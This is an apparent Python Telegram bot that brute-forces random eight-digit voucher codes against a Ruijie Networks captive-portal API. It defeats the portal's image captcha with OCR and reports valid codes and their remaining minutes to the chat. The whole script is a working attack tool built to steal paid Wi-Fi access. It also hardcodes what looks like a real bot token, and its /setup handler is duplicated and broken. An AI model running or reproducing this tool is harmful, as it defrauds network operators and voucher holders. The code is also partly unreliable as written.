import os, subprocess, sys, time, asyncio, aiohttp, json, base64, random, re, string, uuid
from datetime import datetime, timezone

# --- Essential Auto-Installer ---
def setup_env( ):
    packages = ["pyTelegramBotAPI", "aiohttp", "opencv-python-headless", "ddddocr", "numpy"]
    for p in packages:
        try:
            if p == "pyTelegramBotAPI": import telebot
            else: __import__(p )
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", p])

setup_env()

import telebot
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2, ddddocr, numpy as np

# ─── CONFIGURATION ───
BOT_TOKEN = "8809913843:AAGevNkeQJtPVNyr6u2R9KrdZvsy0KN9sJw"
ADMIN_ID = "5510812164"
bot = AsyncTeleBot(BOT_TOKEN )

_ocr = None
_connector = None
session = None
STATE_FILE = "bot_state.json"

# States
user_data = {}
approve = {int(ADMIN_ID): True}
scan_tasks = {}
success_texts = {}

SCAN_CONCURRENCY = 15 
SCAN_DELAY = 0.4

async def get_ocr():
    global _ocr
    if _ocr is None: _ocr = ddddocr.DdddOcr(show_ad=False)
    return _ocr

def save_state():
    data = {
        "user_data": {str(k):v for k,v in user_data.items()},
        "approve": {str(k):v for k,v in approve.items()},
        "success_texts": {str(k):v for k,v in success_texts.items()}
    }
    with open(STATE_FILE, "w") as f: json.dump(data, f)

def load_state():
    global user_data, approve, success_texts
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE) as f:
                d = json.load(f)
                user_data = {int(k):v for k,v in d.get("user_data", {}).items()}
                approve.update({int(k):v for k,v in d.get("approve", {}).items()})
                success_texts = {int(k):v for k,v in d.get("success_texts", {}).items()}
        except: pass

async def get_balance(sid):
    url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{sid}"
    try:
        async with session.get(url, timeout=10 ) as r:
            data = await r.json()
            d = data.get("result") or data.get("data") or data
            for k in ["totalMinutes", "remainingMinutes", "balance"]:
                if d.get(k) is not None: return f"{d[k]}m"
    except: pass
    return "N/A"

async def perform_check(url, code, chat_id, scan_id):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False ) as s:
        try:
            async with s.get(url, timeout=10) as r:
                sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
                sid = sid.group(1) if sid else None
            if not sid: return None
            
            p = {"sessionId": sid, "_t": str(time.time())}
            async with s.get("https://portal-as.ruijienetworks.com/api/auth/captcha/image", params=p ) as r:
                img = await r.read()
            
            nparr = np.frombuffer(img, np.uint8)
            img_cv = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            _, buffer = cv2.imencode(".png", cv2.cvtColor(img_cv, cv2.COLOR_BGR2GRAY))
            ocr_engine = await get_ocr()
            txt = ocr_engine.classification(buffer.tobytes()).upper()
            
            data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": txt}
            async with s.post(post_url, json=data, timeout=10) as r:
                resp = await r.json()
                if "logonUrl" in str(resp):
                    plan = await get_balance(sid)
                    success_texts.setdefault(chat_id, []).append(f"{code} ({plan})")
                    save_state()
                    await bot.send_message(chat_id, f"💎 FOUND: `{code}`\n⏰ Plan: {plan}", parse_mode="Markdown")
                    return code
        except: pass
    return None

async def run_scan(chat_id, url, scan_id, p_msg):
    checked = 0; found = 0; start = time.monotonic()
    while chat_id in scan_tasks and scan_tasks[chat_id]['scan_id'] == scan_id:
        if scan_tasks[chat_id].get('stop'): break
        batch = ["".join(random.choice(string.digits) for _ in range(8)) for _ in range(SCAN_CONCURRENCY)]
        results = await asyncio.gather(*[perform_check(url, c, chat_id, scan_id) for c in batch])
        for r in results:
            if r: found += 1
        checked += len(batch)
        if checked % 60 == 0:
            speed = (checked / (time.monotonic() - start) * 60)
            try: await bot.edit_message_text(f"🔍 Checking...\n⚡ Speed: {speed:,.0f}/min\n📋 Checked: {checked}\n💎 Found: {found}", chat_id, p_msg.message_id)
            except: pass
        await asyncio.sleep(SCAN_DELAY)

@bot.message_handler(commands=['start', 'help'])
async def welcome(message):
    await bot.reply_to(message, "✅ Bot is Ready!\n\n/setup [url] - Portal URL သွင်းရန်\n/brute - Scan စတင်ရန်\n/stop - ရပ်တန့်ရန်\n/saved - တွေ့ထားသော Code များကြည့်ရန်")

@bot.message_handler(commands=['setup'])
async def setup(message):
@bot.message_handler(commands=["setup"])
async def setup(message):
    args = message.text.split()
    if len(args) < 2: return await bot.reply_to(message, "Usage: /setup [url]")
    args = message.text.split()
    if len(args) < 2: return await bot.reply_to(message, "Usage: /setup [url]")
    user_data[message.chat.id] = {"url": args[1]}
    save_state()
    await bot.reply_to(message, "✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်နိုင်ပါပြီ။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    cid = message.chat.id
    if cid not in user_data: return await bot.reply_to(message, "/setup အရင်လုပ်ပေးပါဗျ။")
    if cid in scan_tasks: return await bot.reply_to(message, "Scan အလုပ်လုပ်နေဆဲပါ။")
    p_msg = await bot.send_message(cid, "🔍 Scan စတင်နေပါပြီ...")
    sid = str(uuid.uuid4())
    scan_tasks[cid] = {"scan_id": sid, "stop": False}
    asyncio.create_task(run_scan(cid, user_data[cid]['url'], sid, p_msg))

@bot.message_handler(commands=['stop'])
async def stop(message):
    if message.chat.id in scan_tasks:
        scan_tasks[message.chat.id]['stop'] = True
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်လိုက်ပါပြီ။")
    else: await bot.reply_to(message, "အလုပ်လုပ်နေတဲ့ Scan မရှိပါဘူး။")

@bot.message_handler(commands=['saved'])
async def saved(message):
    codes = success_texts.get(message.chat.id, [])
    if codes:
        await bot.reply_to(message, "💎 တွေ့ရှိထားသော Code များ:\n\n" + "\n".join(codes))
    else:
        await bot.reply_to(message, "မည်သည့် Code မျှ မတွေ့သေးပါဘူး။")

async def web_server():
    app = web.Application()
    app.router.add_get("/", lambda r: web.Response(text="Bot is Alive"))
    runner = web.AppRunner(app); await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    try: await web.TCPSite(runner, "0.0.0.0", port).start()
    except: pass

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=50 )
    session = aiohttp.ClientSession(connector=_connector )
    load_state()
    asyncio.create_task(web_server())
    print("Bot is starting...")
    while True:
        try: await bot.infinity_polling(timeout=60)
        except: await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
